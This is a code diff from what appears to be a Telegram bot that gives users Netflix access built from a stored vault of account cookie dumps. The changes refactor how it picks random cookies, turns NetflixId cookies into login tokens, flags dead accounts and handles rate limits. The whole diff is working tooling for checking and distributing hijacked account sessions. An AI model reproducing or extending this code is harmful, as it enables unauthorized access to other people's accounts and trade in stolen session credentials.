@@ -1,8 +1,9 @@
 import type { Bot } from './bot';
 import type { CountryFilter, VaultEntry } from './types';
+import type { VaultResult } from './vaultstore';
 import { adminContact, escapeHtml } from './telegram';
 import { getStats, isUnlimited, remainingQuota } from './stats';
-import { extractCookieDict, extractMetadata, fetchNfToken, maskEmail } from './netflix';
+import { extractCookieDict, extractMetadata, fetchNfToken, isDeadFailure, maskEmail } from './netflix';
 import { resolveCountry } from './countries';
 import { startLoading } from './loading';
 import type { Loading } from './loading';
@@ -70,16 +71,18 @@ export async function processGeneration(
   let loading: Loading | null = null;
 
   try {
-    const vault = (await bot.kv.getVault()) || [];
+    // Ambil kandidat acak dari D1 (satu query), bukan lagi membaca seluruh
+    // vault ke memori. Inilah yang membuat 5000 akun tetap aman di bawah
+    // batas CPU 10 ms free plan.
+    const candidates = await bot.vault.pickRandom(countryFilter, MAX_RANDOM_ATTEMPTS);
+
     let nfToken: string | null = null;
     let expires: number | null = null;
     let meta: ReturnType<typeof extractMetadata> | null = null;
 
-    const filteredVault = filterVaultByCountry(vault, countryFilter);
-
     // Cek stok DULUAN. Bila tidak ada akun, user tidak dihukum cooldown
     // karena memang tidak ada yang bisa dilayani.
-    if (filteredVault.length === 0) {
+    if (candidates.length === 0) {
       const scope = countryFilter && countryFilter !== 'global' ? countryFilter.toUpperCase() : 'SEMUA NEGARA';
       await bot.send(
         chatId,
@@ -94,19 +97,17 @@ export async function processGeneration(
     if (!loading.shown) await bot.send(chatId, verifyMsg);
 
     let success = false;
+    let inconclusive = false;
     let accountsRemoved = 0;
-    const deadIds = new Set<number>();
+    // Akun mati ditandai `dead` (bukan langsung dihapus) supaya masih bisa
+    // dilaporkan di /admin, lalu dipangkas oleh pembersihan berkala.
+    const dead: VaultResult[] = [];
 
-    for (let i = 0; i < MAX_RANDOM_ATTEMPTS; i++) {
-      if (filteredVault.length === 0) break;
-
-      const randomIdx = Math.floor(Math.random() * filteredVault.length);
-      const candidate = filteredVault[randomIdx];
+    for (const candidate of candidates) {
       const cookieDict = extractCookieDict(candidate.rawText);
 
       if (!cookieDict.NetflixId) {
-        filteredVault.splice(randomIdx, 1);
-        deadIds.add(candidate.id);
+        dead.push({ id: candidate.id, status: 'dead', reason: 'tanpa_cookie' });
         accountsRemoved++;
         continue;
       }
@@ -118,19 +119,36 @@ export async function processGeneration(
         meta = extractMetadata(candidate.rawText);
         success = true;
         break;
-      } catch {
-        filteredVault.splice(randomIdx, 1);
-        deadIds.add(candidate.id);
+      } catch (e) {
+        // Rate-limit / gangguan jaringan BUKAN bukti cookie mati. Jangan buang
+        // akun dan jangan habiskan cooldown user.
+        if (!isDeadFailure(e)) {
+          inconclusive = true;
+          break;
+        }
+        dead.push({ id: candidate.id, status: 'dead', reason: 'cookie_mati' });
         accountsRemoved++;
       }
     }
 
-    if (deadIds.size > 0) {
-      await bot.kv.setVault(vault.filter((v) => !deadIds.has(v.id)));
+    if (dead.length > 0) {
+      await bot.vault.applyResults(dead);
     }
 
     if (!success) {
       if (loading) await loading.finish();
+      if (inconclusive) {
+        await bot.send(
+          chatId,
+          `⚠️ <b>Netflix Sedang Membatasi</b>\n` +
+            `Sistem belum bisa memverifikasi akun saat ini (rate-limit atau gangguan di sisi Netflix).\n\n` +
+            (accountsRemoved > 0
+              ? `🗑️ ${accountsRemoved} akun yang terbukti mati tetap dibuang.\n\n`
+              : '') +
+            `<i>Akun Anda TIDAK dihapus dan tidak ada cooldown yang terpakai. Silakan coba lagi sebentar.</i>`
+        );
+        return;
+      }
       await bot.send(
         chatId,
         `❌ <b>Semua Sampel Acak Mati!</b>\nSistem otomatis menguji dan <b>menghapus ${accountsRemoved} akun mati</b> dari sistem. Silakan coba lagi.\n\n` +
